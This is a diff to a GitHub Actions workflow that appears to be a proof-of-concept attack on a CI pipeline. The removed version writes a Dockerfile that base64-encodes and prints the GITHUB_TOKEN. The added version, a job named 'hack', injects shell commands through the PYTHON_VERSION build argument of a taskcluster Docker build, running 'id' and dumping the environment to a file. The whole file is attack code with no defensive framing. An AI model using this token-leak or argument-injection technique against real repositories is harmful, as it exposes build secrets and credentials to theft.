@@ -1,14 +1,17 @@
-name: RCE Token Leak PoC
-on: [push]
+name: Exploit PYTHON_VERSION
+on: push
 
 jobs:
-  rce:
+  hack:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v2
+      - uses: actions/checkout@v2
 
-      - name: Build injected Dockerfile
+      - name: Trigger RCE via PYTHON_VERSION
         run: |
-          echo -e "FROM alpine\nRUN echo \$GITHUB_TOKEN | base64 > /leaked && cat /leaked" > Dockerfile
-          docker build -t poc .
+          # Inject a malicious PYTHON_VERSION with shell commands
+          MALICIOUS_ARG="3.11-alpine; RUN echo 'HACKED: ' && id && env > /env"
+          docker build \
+            --build-arg PYTHON_VERSION="$MALICIOUS_ARG" \
+            -t hacked \
+            ./taskcluster/docker/python
